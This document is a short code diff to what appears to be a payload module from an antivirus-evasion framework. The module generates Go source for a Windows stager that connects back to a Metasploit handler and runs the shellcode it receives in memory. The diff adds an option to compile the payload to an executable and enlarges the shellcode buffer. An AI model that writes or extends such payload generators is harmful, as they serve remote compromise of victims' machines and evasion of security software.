@@ -22,7 +22,8 @@ class Payload:
         
         # options we require user ineraction for- format is {Option : [Value, Description]]}
         self.required_options = {   "LHOST" : ["", "IP of the metasploit handler"],
-                                    "LPORT" : ["", "Port of the metasploit handler"]}
+                                    "LPORT" : ["", "Port of the metasploit handler"],
+                                    "compile_to_exe" : ["Y", "Compile to an executable"]}
     def generate(self):
         memCommit = helpers.randomString()
         memReserve = helpers.randomString()
@@ -85,7 +86,7 @@ class Payload:
         payloadCode += "for i := 0; i < int(%s); i++ {\n" %(qty)
         payloadCode += "%s = append(%s, %s[i])\n}\n%s += %s\n}\n" %(sc2, sc2, sc, total, qty)
         payloadCode += "%s, _ := %s(uintptr(%s + 5))\n" %(mem, virtualAlloc, scLength)
-        payloadCode += "%s := (*[800000]byte)(unsafe.Pointer(%s))\n" %(buffer, mem)
+        payloadCode += "%s := (*[900000]byte)(unsafe.Pointer(%s))\n" %(buffer, mem)
         payloadCode += "%s := (uintptr)(unsafe.Pointer(%s))\n" %(handle, socket)
         payloadCode += "%s[0] = 0xBF\n" %(buffer)
         payloadCode += "%s[1] = byte(%s)\n" %(buffer, handle)
